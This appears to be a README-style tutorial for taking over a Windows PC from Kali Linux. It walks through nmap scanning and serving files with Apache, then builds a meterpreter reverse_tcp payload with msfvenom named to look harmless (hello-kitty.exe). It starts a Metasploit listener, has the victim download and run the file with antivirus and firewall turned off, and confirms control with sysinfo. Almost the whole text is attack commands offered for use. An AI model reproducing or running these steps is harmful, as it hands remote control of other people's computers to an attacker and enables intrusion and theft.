# Revrse-shell
Control any PC using linux
Run every command step by step
# check IP in Linux
hostname -I

#Scan the network
nmap -F -Pn 192.168.10.171

#status of apache server
sudo systemctl status apache2
#There you have to provide your kali password

#start the apache server
sudo systemctl start apache2 

#Enable the apache server
sudo systemctl enable apache2

#Now check the apache server again 
sudo systemctl status apache2

#Go to the html file. if you use kali your directory path will be the same
cd /var/www/html

#Create a html file 
sudo nano test.html  

#Create a directory named exploit
sudo mkdir exploit 

#Go to the root 
sudo su

#create the malware
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=192.168.10.191 \(kali IP)
LPORT=5000 \(if it is not working then use 5001)
--platform Windows \
> -a x64 \
> -f exe \
> -o hello-kitty.exe   

#Run the malware
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_tcp; \
set lhost 0.0.0.0; \
set lport 5000; \
exploit;"

#go to target machine
#search like this [ kali_ip/exploit ]
#make sure your machines Virus and thread protection settings all security is disable
#make sure all firewall and network protection is disable
#download the hello-kitty.exe file and execute

#Go to linux file you will show meterpreter
#Check system info
sysinfo

#Now you will see you have the access of Windows


